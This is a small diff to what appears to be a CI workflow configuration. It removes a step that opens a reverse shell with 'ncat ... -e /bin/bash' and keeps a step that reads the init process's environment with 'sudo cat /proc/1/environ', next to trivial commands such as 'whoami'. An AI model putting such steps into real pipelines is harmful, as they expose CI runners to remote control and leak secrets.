@@ -8,7 +8,6 @@ jobs:
             - run: echo "foo bar"
             - run: touch /tmp/foo
             - run: whoami
-            - run: ncat 127.0.0.1 4444 -e /bin/bash
             - run: sudo cat /proc/1/environ
 
 workflows:
